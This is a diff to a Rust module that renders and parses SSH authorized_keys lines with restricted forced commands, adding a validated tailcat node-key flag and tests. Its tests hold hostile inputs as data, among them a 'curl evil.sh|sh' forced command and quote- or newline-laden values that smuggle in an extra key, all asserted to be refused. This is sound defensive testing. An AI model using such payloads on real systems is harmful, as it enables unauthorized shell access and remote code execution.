@@ -74,6 +74,13 @@ pub struct Entry {
     pub scope: Scope,
     /// The key's comment, which for our own lines is the name `render` chose.
     pub label: String,
+    /// The device's tailcat node public key, as the forced command names it.
+    ///
+    /// Empty for a foreign line, for a Key B of ours, and for every line
+    /// written before the tunnel existed. Empty is not "unknown": it is a
+    /// device the tunnel must never admit, which is exactly right for one
+    /// enrolled by a build that had no tunnel to admit it to.
+    pub node_key: String,
     /// Which local account's `authorized_keys` this line was read from.
     ///
     /// Not in the line — nothing in `authorized_keys` names the account it
@@ -215,6 +222,7 @@ fn entry_from_line(line: &str) -> Entry {
         client_id: String::new(),
         scope: Scope::Unspecified,
         label: key.map(|k| k.comment().to_string()).unwrap_or_default(),
+        node_key: String::new(),
         account: None,
         line: raw.to_string(),
         shell_access: false,
@@ -236,6 +244,7 @@ fn entry_from_line(line: &str) -> Entry {
             // forced command. `shell_access` is what says what it does grant.
             scope: Scope::Unspecified,
             label: comment.clone(),
+            node_key: String::new(),
             account: None,
             line: raw.to_string(),
             shell_access: true,
@@ -255,12 +264,21 @@ fn entry_from_line(line: &str) -> Entry {
         // ours, and reporting it as unspecified is honest: the daemon that
         // serves it will refuse the word too, so it grants nothing.
         .unwrap_or(Scope::Unspecified);
+    // The filter is not decoration: a hand-edited line can hold anything, and
+    // a node key read out of a file is admitted to a tunnel. Validate on the
+    // way in as well as on the way out.
+    let node_key = forced_command(options)
+        .and_then(|command| flag(command, "--node-key"))
+        .filter(|k| usable_node_key(k))
+        .unwrap_or_default()
+        .to_string();
 
     Entry {
         fingerprint: key.fingerprint(ssh_key::HashAlg::Sha256).to_string(),
         client_id: client_id.to_string(),
         scope,
         label: key.comment().to_string(),
+        node_key,
         account: None,
         line: raw.to_string(),
         shell_access: false,
@@ -366,6 +384,9 @@ pub enum Rejected {
     Unscoped,
     /// A plain line was asked for at a scope below `host_admin`.
     ShellScope,
+    /// A node key that could not survive being written into a forced command,
+    /// or one offered for a line that has no forced command to hold it.
+    NodeKey,
 }
 
 impl std::fmt::Display for Rejected {
@@ -377,6 +398,7 @@ impl std::fmt::Display for Rejected {
             Self::ClientId => "not a usable client id",
             Self::Unscoped => "no scope",
             Self::ShellScope => "a shell key below host_admin",
+            Self::NodeKey => "not a usable node key",
         })
     }
 }
@@ -482,9 +504,17 @@ pub fn render(
     client_id: &str,
     scope: Scope,
     grant: Grant,
+    node_key: Option<&str>,
 ) -> Result<String, Rejected> {
     if received.contains(['\r', '\n']) {
         return Err(Rejected::MultiLine);
+    }
+    if let Some(node_key) = node_key {
+        // A plain line has no forced command, so there is nowhere to put this.
+        // Refusing beats writing a line that silently admits nothing.
+        if grant == Grant::Shell || !usable_node_key(node_key) {
+            return Err(Rejected::NodeKey);
+        }
     }
     // The client id is interpolated into the forced command, inside quotes, so
     // it is a second way to smuggle a line in: an id containing `"` closes the
@@ -532,11 +562,14 @@ pub fn render(
         Rejected::Unparseable
     })?;
     let line = match grant {
-        Grant::FarCooler => format!(
-            "restrict,command=\"{} --client {client_id} --scope {}\" {body}",
-            forced_program(),
-            scope_word(scope)
-        ),
+        Grant::FarCooler => {
+            let node = node_key.map(|k| format!(" --node-key {k}")).unwrap_or_default();
+            format!(
+                "restrict,command=\"{} --client {client_id} --scope {}{node}\" {body}",
+                forced_program(),
+                scope_word(scope),
+            )
+        }
         // No options field at all, which is the entire difference: sshd gives
         // this key a shell, so Zed, git and Terminal work. The key material and
         // the comment are still rebuilt above, so a plain line is not a way to
@@ -559,6 +592,17 @@ fn usable_client_id(client_id: &str) -> bool {
     !client_id.is_empty()
         && client_id.len() <= 64
         && client_id.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
+}
+
+/// 43 characters of unpadded base64, and nothing else.
+///
+/// Deliberately not a base64 decode: what matters here is that the string
+/// cannot end the quoted command it is interpolated into, and a decoder that
+/// accepts whitespace or padding would let it. An X25519 public key is 32
+/// bytes, so the length is a constant rather than a range.
+fn usable_node_key(node_key: &str) -> bool {
+    node_key.len() == 43
+        && node_key.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
 }
 
 /// The key is the identity; the comment is a label for humans.
@@ -1185,7 +1229,7 @@ mod tests {
              command=\"curl evil.sh|sh\" ssh-ed25519 {OTHER_KEY} them"
         );
         assert!(matches!(
-            render(&hostile, "phone", "c1", Scope::Control, Grant::FarCooler),
+            render(&hostile, "phone", "c1", Scope::Control, Grant::FarCooler, None),
             Err(Rejected::MultiLine)
         ));
     }
@@ -1194,14 +1238,14 @@ mod tests {
     #[test]
     fn an_options_field_in_the_received_key_is_refused() {
         let hostile = format!("command=\"sh\" ssh-ed25519 {KEY} x");
-        assert!(render(&hostile, "phone", "c1", Scope::Control, Grant::FarCooler).is_err());
+        assert!(render(&hostile, "phone", "c1", Scope::Control, Grant::FarCooler, None).is_err());
     }
 
     /// Ed25519 only, so nothing arrives that this has not reasoned about.
     #[test]
     fn a_non_ed25519_key_is_refused() {
         assert!(matches!(
-            render(RSA, "phone", "c1", Scope::Control, Grant::FarCooler),
+            render(RSA, "phone", "c1", Scope::Control, Grant::FarCooler, None),
             Err(Rejected::Algorithm)
         ));
     }
@@ -1214,8 +1258,8 @@ mod tests {
     #[test]
     fn the_comment_is_regenerated_from_the_label_we_chose() {
         let key = format!("ssh-ed25519 {KEY} whatever they/typed");
-        let line =
-            render(&key, "iPhone 17", "c1", Scope::Control, Grant::FarCooler).expect("render");
+        let line = render(&key, "iPhone 17", "c1", Scope::Control, Grant::FarCooler, None)
+            .expect("render");
         assert!(line.contains("farcooler-iPhone-17-"), "label not ours: {line}");
         assert!(!line.contains("they/typed"), "their comment survived: {line}");
         assert!(!line.contains('\n'), "a newline reached the line: {line}");
@@ -1225,7 +1269,8 @@ mod tests {
     #[test]
     fn every_entry_is_restricted_and_forced() {
         let key = format!("ssh-ed25519 {KEY} x");
-        let line = render(&key, "iPhone", "c1", Scope::Read, Grant::FarCooler).expect("render");
+        let line =
+            render(&key, "iPhone", "c1", Scope::Read, Grant::FarCooler, None).expect("render");
         assert!(line.starts_with("restrict,command=\""), "not restricted: {line}");
         assert!(line.contains("--client c1"), "no client id: {line}");
         assert!(line.contains("--scope read"), "no scope: {line}");
@@ -1251,7 +1296,8 @@ mod tests {
     #[test]
     fn the_forced_command_names_this_channels_daemon_by_path() {
         let key = format!("ssh-ed25519 {KEY} x");
-        let line = render(&key, "iPhone", "c1", Scope::Read, Grant::FarCooler).expect("render");
+        let line =
+            render(&key, "iPhone", "c1", Scope::Read, Grant::FarCooler, None).expect("render");
         let expected = farcooler_protocol::CHANNEL.daemon_binary_name();
         assert!(
             line.contains(&format!("command=\"~/.local/bin/{expected} --stdio")),
@@ -1277,11 +1323,11 @@ mod tests {
         let key = format!("ssh-ed25519 {KEY} x");
         let hostile = format!("c1\" ssh-ed25519 {OTHER_KEY} them");
         assert!(matches!(
-            render(&key, "phone", &hostile, Scope::Control, Grant::FarCooler),
+            render(&key, "phone", &hostile, Scope::Control, Grant::FarCooler, None),
             Err(Rejected::ClientId)
         ));
         assert!(matches!(
-            render(&key, "phone", "", Scope::Control, Grant::FarCooler),
+            render(&key, "phone", "", Scope::Control, Grant::FarCooler, None),
             Err(Rejected::ClientId)
         ));
     }
@@ -1291,7 +1337,7 @@ mod tests {
     fn an_unscoped_enrollment_is_refused_rather_than_granted_everything() {
         let key = format!("ssh-ed25519 {KEY} x");
         assert!(matches!(
-            render(&key, "phone", "c1", Scope::Unspecified, Grant::FarCooler),
+            render(&key, "phone", "c1", Scope::Unspecified, Grant::FarCooler, None),
             Err(Rejected::Unscoped)
         ));
     }
@@ -1300,7 +1346,8 @@ mod tests {
     #[test]
     fn a_rendered_line_round_trips() {
         let key = format!("ssh-ed25519 {KEY} x");
-        let line = render(&key, "iPhone", "c1", Scope::Control, Grant::FarCooler).expect("render");
+        let line = render(&key, "iPhone", "c1", Scope::Control, Grant::FarCooler, None)
+            .expect("render");
         let text = format!("{BEGIN}\n{line}\n{END}\n");
         let entries = parse(&text).expect("parse");
         assert_eq!(entries.len(), 1);
@@ -1319,6 +1366,59 @@ mod tests {
         assert!(entries[0].client_id.is_empty(), "a foreign line claimed a client id");
     }
 
+    /// 32 bytes of X25519 public key is 43 characters of unpadded base64.
+    const NODE_KEY: &str = "3q2-7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+
+    #[test]
+    fn a_node_key_lands_in_the_forced_command() {
+        let key = format!("ssh-ed25519 {KEY} x");
+        let line =
+            render(&key, "phone", "c1", Scope::Read, Grant::FarCooler, Some(NODE_KEY)).unwrap();
+        assert!(line.contains(&format!("--node-key {NODE_KEY}")), "no node key: {line}");
+        assert!(line.starts_with("restrict,command=\""), "not restricted: {line}");
+    }
+
+    #[test]
+    fn a_line_without_a_node_key_carries_no_flag() {
+        let key = format!("ssh-ed25519 {KEY} x");
+        let line = render(&key, "phone", "c1", Scope::Read, Grant::FarCooler, None).unwrap();
+        assert!(!line.contains("--node-key"), "flag written for None: {line}");
+    }
+
+    #[test]
+    fn a_rendered_node_key_reads_back() {
+        let key = format!("ssh-ed25519 {KEY} x");
+        let line =
+            render(&key, "phone", "c1", Scope::Read, Grant::FarCooler, Some(NODE_KEY)).unwrap();
+        assert_eq!(entry_from_line(&line).node_key, NODE_KEY);
+    }
+
+    /// The node key is interpolated into a quoted forced command, so it is a third
+    /// way to smuggle a line in beside the client id and the label.
+    #[test]
+    fn a_node_key_that_could_end_the_command_is_refused() {
+        let key = format!("ssh-ed25519 {KEY} x");
+        for hostile in ["ab\" ssh-ed25519 AAAA them", "ab cd", "ab\nrestrict", ""] {
+            let out = render(&key, "phone", "c1", Scope::Read, Grant::FarCooler, Some(hostile));
+            assert!(matches!(out, Err(Rejected::NodeKey)), "accepted {hostile:?}: {out:?}");
+        }
+    }
+
+    /// Key B is a plain unrestricted line with no forced command, so it has
+    /// nowhere to put a node key and must not silently drop one.
+    #[test]
+    fn a_shell_line_refuses_a_node_key() {
+        let key = format!("ssh-ed25519 {KEY} x");
+        let out = render(&key, "mac", "c1", Scope::HostAdmin, Grant::Shell, Some(NODE_KEY));
+        assert!(matches!(out, Err(Rejected::NodeKey)), "shell line took a node key: {out:?}");
+    }
+
+    #[test]
+    fn a_foreign_line_has_no_node_key() {
+        let entry = entry_from_line(&format!("ssh-ed25519 {OTHER_KEY} someone"));
+        assert_eq!(entry.node_key, "");
+    }
+
     // -----------------------------------------------------------------------
     // Key B: the plain line
     //
@@ -1331,8 +1431,8 @@ mod tests {
     #[test]
     fn a_shell_line_is_plain_and_names_its_device_in_its_comment() {
         let key = format!("ssh-ed25519 {KEY} x");
-        let line =
-            render(&key, "MacBook Air", "mac-1", Scope::HostAdmin, Grant::Shell).expect("render");
+        let line = render(&key, "MacBook Air", "mac-1", Scope::HostAdmin, Grant::Shell, None)
+            .expect("render");
         assert!(line.starts_with("ssh-ed25519 "), "a shell line carried options: {line}");
         assert!(!line.contains("restrict"), "a shell line was restricted: {line}");
         assert!(!line.contains("command="), "a shell line carried a forced command: {line}");
@@ -1348,8 +1448,8 @@ mod tests {
     #[test]
     fn a_shell_line_round_trips_as_ours_and_claims_no_scope() {
         let key = format!("ssh-ed25519 {KEY} x");
-        let line =
-            render(&key, "MacBook Air", "mac.1_2", Scope::HostAdmin, Grant::Shell).expect("render");
+        let line = render(&key, "MacBook Air", "mac.1_2", Scope::HostAdmin, Grant::Shell, None)
+            .expect("render");
         let entries = parse(&format!("{BEGIN}\n{line}\n{END}\n")).expect("parse");
         assert_eq!(entries.len(), 1);
         // A dotted id on purpose: the comment's own delimiter is a dot, and an
@@ -1371,7 +1471,7 @@ mod tests {
     #[test]
     fn a_shell_line_gets_our_comment_rather_than_theirs() {
         let key = format!("ssh-ed25519 {KEY} whatever they/typed");
-        let line = render(&key, "MacBook Air", "mac-1", Scope::HostAdmin, Grant::Shell)
+        let line = render(&key, "MacBook Air", "mac-1", Scope::HostAdmin, Grant::Shell, None)
             .expect("render");
         assert!(!line.contains("they/typed"), "their comment survived: {line}");
         // Their comment is where the device id goes, so a comment carried
@@ -1388,17 +1488,17 @@ mod tests {
         let admin = Scope::HostAdmin;
         let smuggled = format!("ssh-ed25519 {KEY} ok\nssh-ed25519 {OTHER_KEY} them");
         assert!(matches!(
-            render(&smuggled, "mac", "mac-1", admin, Grant::Shell),
+            render(&smuggled, "mac", "mac-1", admin, Grant::Shell, None),
             Err(Rejected::MultiLine)
         ));
         let with_options = format!("command=\"sh\" ssh-ed25519 {KEY} x");
-        assert!(render(&with_options, "mac", "mac-1", admin, Grant::Shell).is_err());
+        assert!(render(&with_options, "mac", "mac-1", admin, Grant::Shell, None).is_err());
         assert!(matches!(
-            render(RSA, "mac", "mac-1", admin, Grant::Shell),
+            render(RSA, "mac", "mac-1", admin, Grant::Shell, None),
             Err(Rejected::Algorithm)
         ));
         assert!(matches!(
-            render("not a key at all", "mac", "mac-1", admin, Grant::Shell),
+            render("not a key at all", "mac", "mac-1", admin, Grant::Shell, None),
             Err(Rejected::Unparseable)
         ));
 
@@ -1411,7 +1511,7 @@ mod tests {
         for hostile in ["", "mac 1", "mac\"1", &format!("mac\nssh-ed25519 {OTHER_KEY} them")] {
             assert!(
                 matches!(
-                    render(&key, "mac", hostile, admin, Grant::Shell),
+                    render(&key, "mac", hostile, admin, Grant::Shell, None),
                     Err(Rejected::ClientId)
                 ),
                 "a hostile client id was accepted for a plain line: {hostile:?}"
@@ -1432,7 +1532,7 @@ mod tests {
         for scope in [Scope::Read, Scope::Control, Scope::Unspecified] {
             assert!(
                 matches!(
-                    render(&key, "mac", "mac-1", scope, Grant::Shell),
+                    render(&key, "mac", "mac-1", scope, Grant::Shell, None),
                     Err(Rejected::ShellScope)
                 ),
                 "a plain line was rendered at {scope:?}"
